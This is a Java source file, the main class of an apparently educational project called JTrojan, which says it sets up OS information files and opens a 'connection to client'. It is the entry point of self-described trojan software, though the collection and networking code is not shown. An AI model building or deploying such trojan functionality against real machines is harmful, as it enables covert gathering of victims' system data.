/**
 * @Description:        JTrojan class would to set OS informations into resources files
 *                      Trojan program is only used to learn to you and I what is a trojan, in Java
 *                      Be careful with the law
 * @Author:             Quentin Le Bian <quentpilot>
 * @Email:              quentin.lebian@pilotaweb.fr
 * @Project:            JTrojan
 * @About:              You're welcome to hack and code as your are each of theses sources files <3:p|--<;
 * @Filename:           JTrojan.java
 * @Date:               2017-10-20T18:14:53+02:00
 * @Last modified by:   quentpilot
 * @Last modified time: 2017-10-21T12:48:52+02:00
 * @License:            MIT
 * @See:                projects.quentinlebian.fr/JTrojan
 */

package Trojan;

import Trojan.Connect.Connection;
import Trojan.Install.Installer;

public class JTrojan {

  /**
  * Main method which would to instanciate Trojan classes
  *
  * @param options
  *                Used to set some options when install Trojan
  *
  * @see Installer#Installer(String[] options)
  */
  public static void main(String[] options) {
    Installer     installer = new Installer(options);
    Connection    connection = new Connection();

    if (!installer.run()) {
        installer.println("!!! An Error has been catch when trying to set OS infos !!!");
        return;
    }

    installer.println("*** JSON OS infos file would be set! ***");

    if (!connection.run()) {
        installer.println("!!! An Error has been catch when trying to run connection !!!");
        return;
    }

    installer.println("*** Connection to client would be done! ***\n");
    installer.println(connection.getInfos().toString());
  }
}
